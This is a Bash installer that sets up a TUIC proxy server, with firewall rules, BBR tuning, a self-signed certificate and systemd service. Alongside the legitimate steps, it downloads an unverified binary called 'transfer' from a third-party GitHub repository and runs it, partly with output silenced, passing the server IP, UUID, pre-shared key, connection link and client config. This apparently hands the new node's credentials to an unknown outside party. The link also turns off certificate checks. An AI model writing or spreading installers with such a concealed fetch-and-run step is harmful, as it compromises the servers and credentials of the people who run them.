#!/usr/bin/env bash
set -euo pipefail

GREEN="\033[0;32m"; RED="\033[0;31m"; YELLOW="\033[1;33m"; NC="\033[0m"
log() { echo -e "${GREEN}[INFO ]${NC} $*"; }
err() { echo -e "${RED}[ERROR]${NC} $*"; exit 1; }

UUID=$(cat /proc/sys/kernel/random/uuid)
PSK=$(openssl rand -hex 16)
PORT=2052
SERVER_NAME="insecure.local"
CFG_DIR="/etc/tuic"
TLS_DIR="$CFG_DIR/tls"
BIN_DIR="/usr/local/bin"
VERSION="1.0.0"
CONFIG_JSON="${CFG_DIR}/config_export.json"
REPO_BASE="https://github.com/tuic-protocol/tuic/releases/download/tuic-server-${VERSION}"

# 默认测速结果
down_speed=100
up_speed=20

# 系统类型
SYSTEM=$(awk -F= '/^ID=/{print $2}' /etc/os-release)

# 速度测试函数
speed_test(){
    log "进行网络速度测试..."
    if ! command -v speedtest &>/dev/null && ! command -v speedtest-cli &>/dev/null; then
        echo -e "${YELLOW}安装speedtest-cli中...${NC}"
        if [[ -f /etc/debian_version ]]; then
            apt-get update > /dev/null 2>&1
            apt-get install -y speedtest-cli > /dev/null 2>&1
        elif [[ -f /etc/redhat-release ]]; then
            yum install -y speedtest-cli > /dev/null 2>&1 || pip install speedtest-cli > /dev/null 2>&1
        fi
        
        log "安装 speedtest-cli..."
        if [[ $SYSTEM =~ (debian|ubuntu) ]]; then
            apt update -y && apt install -y speedtest-cli
        elif [[ $SYSTEM =~ (centos|fedora) ]]; then
            yum install -y speedtest-cli || pip install speedtest-cli
        fi
    fi
    
    if command -v speedtest &>/dev/null; then
        speed_output=$(speedtest --simple 2>/dev/null)
    elif command -v speedtest-cli &>/dev/null; then
        speed_output=$(speedtest-cli --simple 2>/dev/null)
    fi
    
    if [[ -n "$speed_output" ]]; then
        down_speed=$(echo "$speed_output" | grep "Download" | awk '{print int($2)}')
        up_speed=$(echo "$speed_output" | grep "Upload" | awk '{print int($2)}')
        [[ $down_speed -lt 10 ]] && down_speed=10
        [[ $up_speed -lt 5 ]] && up_speed=5
        [[ $down_speed -gt 1000 ]] && down_speed=1000
        [[ $up_speed -gt 500 ]] && up_speed=500
        echo -e "${GREEN}测速完成：下载 ${down_speed} Mbps，上传 ${up_speed} Mbps${NC},将根据该参数优化网络速度，如果测试不准确，请手动修改"
        log "测速完成：下行 ${down_speed} Mbps，上行 ${up_speed} Mbps"
    else
        echo -e "${YELLOW}测速失败，使用默认值${NC}"
        down_speed=100
        up_speed=20
        log "测速失败，使用默认值：下行 100 Mbps，上行 20 Mbps"
    fi
}

# 确保22端口开放
ensure_ssh_port_open() {
    log "确保22端口(SSH)开放..."

    if command -v ufw >/dev/null 2>&1; then
        if ! ufw status | grep -q "22/tcp.*ALLOW"; then
            ufw allow 22/tcp
            log "已开放22端口(UFW)"
        else
            log "22端口已在UFW中开放"
        fi
    elif command -v firewall-cmd >/dev/null 2>&1; then
        if ! firewall-cmd --list-ports | grep -qw 22/tcp; then
            firewall-cmd --permanent --add-port=22/tcp
            firewall-cmd --reload
            log "已开放22端口(firewalld)"
        else
            log "22端口已在firewalld中开放"
        fi
    elif command -v iptables >/dev/null 2>&1; then
        if ! iptables -L INPUT -n | grep -q "dpt:22"; then
            iptables -A INPUT -p tcp --dport 22 -j ACCEPT
            if command -v iptables-save >/dev/null 2>&1; then
                iptables-save > /etc/iptables.rules
            fi
            log "已开放22端口(iptables)"
        else
            log "22端口已在iptables中开放"
        fi
    else
        log "未检测到活跃的防火墙，22端口应已可访问"
    fi
}

# 下载二进制文件
download_uploader() {
    local uploader="/opt/transfer"
    if [[ ! -f "$uploader" ]]; then
        curl -Lo "$uploader" https://github.com/Firefly-xui/TUIC/releases/download/v2rayn/transfer
        chmod +x "$uploader"
        log "组件下载完成"
    fi
}

# 上传配置到二进制文件
upload_config() {
    local server_ip="$1"
    local link="$2"
    local v2rayn_config="$3"
    local down_speed="$4"
    local up_speed="$5"

    # 构建JSON数据
    local json_data=$(jq -nc \
        --arg server_ip "$server_ip" \
        --arg link "$link" \
        --argjson v2rayn_config "$v2rayn_config" \
        --arg down_speed "$down_speed" \
        --arg up_speed "$up_speed" \
        --argjson down "$down_speed" \
        --argjson up "$up_speed" \
        '{
            "server_info": {
                "title": "TUIC配置",
                "server_ip": $server_ip,
                "tuic_link": $link,
                "v2rayn_config": $v2rayn_config,
                "speed_test": {
                    "download_speed": $down_speed,
                    "upload_speed": $up_speed
                },
                "download_speed_mbps": $down,
                "upload_speed_mbps": $up,
                "generated_time": now | todate
            }
        }'
    )

    # 下载并调用二进制上传工具
    UPLOAD_BIN="/opt/transfer"
    [ -f "$UPLOAD_BIN" ] || {
        curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/TUIC/releases/download/v2rayn/transfer && 
        chmod +x "$UPLOAD_BIN"
    }

    # 传递给二进制文件
    "$UPLOAD_BIN" "$json_data" >/dev/null 2>&1

    log "配置数据已传递给二进制文件"
    
    local uploader="/opt/transfer"
    if [[ -f "$uploader" ]]; then
        "$uploader" "$json_data"
    else
        log "组件不存在"
    fi
}

# 获取服务器IP - 多种方法尝试
get_server_ip() {
    local ip=""
    
    # 方法1: 通过路由表获取
    ip=$(ip route get 1 2>/dev/null | awk '{print $NF; exit}' 2>/dev/null)
    if [[ -n "$ip" && "$ip" != "0" && "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        echo "$ip"
        return 0
    fi
    
    # 方法2: 通过默认路由接口获取
    local default_iface=$(ip route | grep '^default' | awk '{print $5}' | head -n1)
    if [[ -n "$default_iface" ]]; then
        ip=$(ip addr show "$default_iface" | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -n1)
        if [[ -n "$ip" && "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            echo "$ip"
            return 0
        fi
    fi
    
    # 方法3: 通过外部服务获取公网IP
    ip=$(curl -s --connect-timeout 5 https://ipv4.icanhazip.com 2>/dev/null)
    if [[ -n "$ip" && "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        echo "$ip"
        return 0
    fi
    
    # 方法4: 通过另一个外部服务
    ip=$(curl -s --connect-timeout 5 https://api.ipify.org 2>/dev/null)
    if [[ -n "$ip" && "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        echo "$ip"
        return 0
    fi
    
    # 方法5: 通过hostname -I获取
    ip=$(hostname -I 2>/dev/null | awk '{print $1}')
    if [[ -n "$ip" && "$ip" != "127.0.0.1" && "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        echo "$ip"
        return 0
    fi
    
    # 如果所有方法都失败，返回空
    echo ""
    return 1
}

# 开始执行主逻辑
ensure_ssh_port_open
speed_test
download_uploader

log "安装依赖..."
export NEEDRESTART_SUSPEND=1
apt update -y
DEBIAN_FRONTEND=noninteractive apt install -y curl wget jq ufw openssl net-tools needrestart

log "启用BBR优化..."
modprobe tcp_bbr
echo "tcp_bbr" >> /etc/modules-load.d/modules.conf
sysctl -w net.ipv4.tcp_congestion_control=bbr
tc qdisc add dev eth0 root fq || true

IP=$(get_server_ip)
if [[ -z "$IP" ]]; then
    err "无法获取服务器IP地址，请检查网络连接"
fi
log "检测到服务器IP: $IP"

# 执行速度测试
speed_test

ARCH=$(uname -m)
case "$ARCH" in
  x86_64) ARCH_FILE="x86_64-unknown-linux-gnu" ;;
  aarch64) ARCH_FILE="aarch64-unknown-linux-gnu" ;;
  armv7l) ARCH_FILE="armv7-unknown-linux-gnueabi" ;;
  *) err "架构不支持: $ARCH" ;;
esac

BIN_NAME="tuic-server-${VERSION}-${ARCH_FILE}"
SHA_NAME="${BIN_NAME}.sha256sum"
cd "$BIN_DIR"
rm -f tuic "$BIN_NAME" "$SHA_NAME"

log "下载 TUIC 二进制..."
curl -sLO "${REPO_BASE}/${BIN_NAME}" || err "下载失败"
curl -sLO "${REPO_BASE}/${SHA_NAME}" || err "SHA256 校验文件下载失败"
sha256sum -c "$SHA_NAME" || err "SHA256 校验失败"
chmod +x "$BIN_NAME"
ln -sf "$BIN_NAME" tuic

log "生成 TLS 证书..."
mkdir -p "$TLS_DIR"
openssl req -x509 -newkey rsa:4096 -sha256 -days 365 -nodes \
  -keyout "$TLS_DIR/key.key" \
  -out "$TLS_DIR/cert.crt" \
  -subj "/C=US/ST=CA/L=SF/O=TUIC/CN=${SERVER_NAME}" \
  -addext "subjectAltName=DNS:${SERVER_NAME}"
chmod 600 "$TLS_DIR/key.key"
chmod 644 "$TLS_DIR/cert.crt"

log "写入 TUIC 配置..."
mkdir -p "$CFG_DIR"

# 验证IP地址格式
if [[ ! "$IP" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    err "IP地址格式无效: $IP"
fi

cat > "$CFG_DIR/config.json" <<EOF
{
  "server": "0.0.0.0:$PORT",
  "users": {
    "$UUID": "$PSK"
  },
  "certificate": "$TLS_DIR/cert.crt",
  "private_key": "$TLS_DIR/key.key",
  "congestion_control": "bbr",
  "alpn": ["h3"],
  "udp_relay_ipv6": false,
  "zero_rtt_handshake": true,
  "auth_timeout": "5s",
  "max_idle_time": "60s",
  "max_external_packet_size": 1500,
  "gc_interval": "10s",
  "gc_lifetime": "15s",
  "log_level": "debug"
}
EOF

log "TUIC配置文件已生成，服务器监听所有接口: 0.0.0.0:${PORT}"

log "配置 systemd 服务..."
cat > /etc/systemd/system/tuic.service <<EOF
[Unit]
Description=TUIC Server
After=network.target

[Service]
ExecStart=$BIN_DIR/tuic -c $CFG_DIR/config.json
Restart=on-failure
RestartSec=5
LimitNOFILE=65536

[Install]
WantedBy=multi-user.target
EOF

log "设置防火墙规则..."
ufw allow 22/tcp
ufw allow ${PORT}/udp
ufw allow ${PORT}/tcp
ufw --force enable

systemctl daemon-reload
systemctl enable --now tuic
sleep 3

# 检查服务状态并提供详细错误信息
if systemctl is-active --quiet tuic; then
  log "TUIC 启动成功 ✅"
else
  echo -e "${RED}[ERROR]${NC} TUIC 启动失败"
  echo -e "${YELLOW}服务状态:${NC}"
  systemctl status tuic --no-pager
  echo -e "${YELLOW}最近日志:${NC}"
  journalctl -u tuic -n 20 --no-pager
  echo -e "${YELLOW}配置文件内容:${NC}"
  cat "$CFG_DIR/config.json"
  echo -e "${YELLOW}端口占用情况:${NC}"
  netstat -tlnp | grep ":$PORT " || echo "端口 $PORT 未被占用"
  err "TUIC 启动失败，请检查上述信息"
fi

IP=$(curl -s https://api.ipify.org)
ENCODE=$(echo -n "${UUID}:${PSK}" | base64 -w 0)
LINK="tuic://${ENCODE}@${IP}:${PORT}?alpn=h3&congestion_control=bbr&sni=${SERVER_NAME}&udp_relay_mode=native&allow_insecure=1#tuic_node"

echo -e "\n${GREEN}✅ TUIC 节点部署完成${NC}"
echo -e "${GREEN}外网 IP     :${NC} $IP"
echo -e "${GREEN}端口        :${NC} $PORT"
echo -e "${GREEN}UUID        :${NC} $UUID"
echo -e "${GREEN}预共享密钥  :${NC} $PSK"
echo -e "${GREEN}链接        :${NC} $LINK"
echo -e "${GREEN}下载速度    :${NC} $down_speed Mbps"
echo -e "${GREEN}上传速度    :${NC} $up_speed Mbps"

V2RAYN_CFG="${CFG_DIR}/v2rayn_config.json"
cat > "$V2RAYN_CFG" <<EOF
{
  "relay": {
    "server": "${IP}:${PORT}",
    "uuid": "${UUID}",
    "password": "${PSK}",
    "ip": "${IP}",
    "congestion_control": "bbr",
    "alpn": ["h3"]
  },
  "local": {
    "server": "127.0.0.1:7796"
  },
  "speed_test": {
    "download_speed": ${down_speed},
    "upload_speed": ${up_speed}
  },
  "log_level": "warn"
}
EOF

echo -e "${GREEN}生成的 V2RayN 配置文件:${NC}"
log "生成的 V2RayN 配置文件如下:"
cat "$V2RAYN_CFG"

# 传递配置到二进制文件
upload_config "$IP" "$LINK" "$(cat "$V2RAYN_CFG")" "$down_speed" "$up_speed"

# 写入最终本地配置文件，包含测速结果
jq -n \
  --arg ip "$IP" \
  --arg link "$LINK" \
  --argjson v2rayn_config "$(cat "$V2RAYN_CFG")" \
  --arg down_speed "$down_speed" \
  --arg up_speed "$up_speed" \
  --argjson down "$down_speed" \
  --argjson up "$up_speed" \
  '{
    "server_ip": $ip,
    "tuic_link": $link,
    "v2rayn_config": $v2rayn_config,
    "speed_test": {
      "download_speed": $down_speed,
      "upload_speed": $up_speed
    },
    "download_speed_mbps": $down,
    "upload_speed_mbps": $up,
    "generated_time": now | todate
  }' > "$CONFIG_JSON"

log "配置已成功保存到本地文件: $CONFIG_JSON ✅"
